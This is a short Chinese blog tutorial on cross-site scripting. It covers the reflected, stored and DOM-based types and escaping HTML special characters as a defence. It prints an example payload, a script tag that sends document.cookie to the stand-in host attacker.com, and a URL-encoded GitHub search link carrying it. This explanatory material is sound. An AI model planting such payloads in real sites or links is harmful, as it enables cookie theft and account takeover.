---
title: XSS攻击
tags:
  - xss
  - web security
categories:
  - Web Security
date: 2017-09-20 16:49:53
---
作为一名前端开发，了解些常见的web安全问题是非常必要的，这里介绍下被提起最多的`XSS`

### XSS是什么

XSS攻击全称跨站脚本攻击 Cross Site Scripting，为了不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS

### XSS攻击会造成哪些危害

XSS攻击最常见的就是获取用户的cookie，session等敏感信息，这些信息一般保存着用户登陆状态等信息，攻击者拿到这些就可以登陆被攻击者的账户，至于登陆后可以做的事。。就不展开了

除了对用户账号安全产生威胁之外，XSS攻击还会对网站本身造成危害，比如持续向服务器发送请求，DDos攻击等等

### XSS攻击的类型

#### 基于反射的攻击（非持久化）

基于反射的XSS攻击一般是服务器端根据用户的输入或者查询条件返回了带有恶意脚本的结果并在客户端执行

比如我们在github的搜索框中输入
`<script src='attacker.com?cookie=' + document.cookie></script>`

页面会返回：

{% asset_img githubXSSTest.jpg githubXSSTest %}

如果这句代码在页面中被当作html语句进行处理(github中对返回的语句进行了处理)，那么在页面渲染的时候，`'attacker.com?cookie=' + document.cookie`就会被执行，结果显而易见，我们的cookie被泄漏了

如果我们被别人引导，点击了下面的链接，恰好该网站没有做XSS相关的处理，我们的cookie就在被点击的瞬间被泄漏了

`https://github.com/search?utf8=%E2%9C%93&q=%3Cscript+src%3D%27attacker.com%3Fcookie%3D%27+%2B+document.cookie%3E%3C%2Fscript%3E&type=`

#### 基于存储的攻击（持久化）

基于存储的攻击也是项目标网站注入可执行样本，攻击者的恶意代码会被存储到网站服务器上，这种漏洞常见于存在于评论系统中。

当我们提交的评论中包含了恶意代码之后，被存储到数据库中，别人看帖时，我们的评论就会被读取展示出来，这时候如果网站存在XSS漏洞，我们提交的恶意代码就会被执行，结果也是cookie泄漏

#### 基于DOM的攻击（非持久化）

基于DOM的攻击和基于反射的攻击非常相像

我们在开发过程中，经常会通过链接将参数从一个页面带到另外一个页面，比如 `xxxxxx.qunar.com?depStation=北京`，在页面加载的时候，将depStation的值取出，填充到某 DOM元素中

如果将北京替换成
`<script src='attacker.com?cookie=' + document.cookie></script>`

在存在XSS漏洞的网站中，这句代码会被执行，结果就是cookie泄漏

### 如何防御XSS漏洞

从上文列举的 XSS 恶意输入可以看到，这些输入中包含了一些特殊的 HTML 字符如 "<"、">"。当传送到客户端浏览器显示时，浏览器会解释执行这些 HTML 或JavaScript 代码而不是直接显示这些字符串。< > & “ 等字符在HTML语言中有特殊含义，对于用户输入的特殊字符，如何直接显示在网页中而不是被浏览器当作特殊字符进行解析?

HTML字符实体由 & 符号、实体名字或者 # 加上实体编号、分号三部分组成。以下为 HTML 中一些特殊字符的编码。有的字符实体只有实体编号，没有对应的实体名字，譬如单引号。

· `&` 转成 `&amp;`
· `“` 转成 `&quot;`
· `<` 转成 `&lt;`
· `>` 转成 `&gt;`
· `‘` 转成 `&#39;`
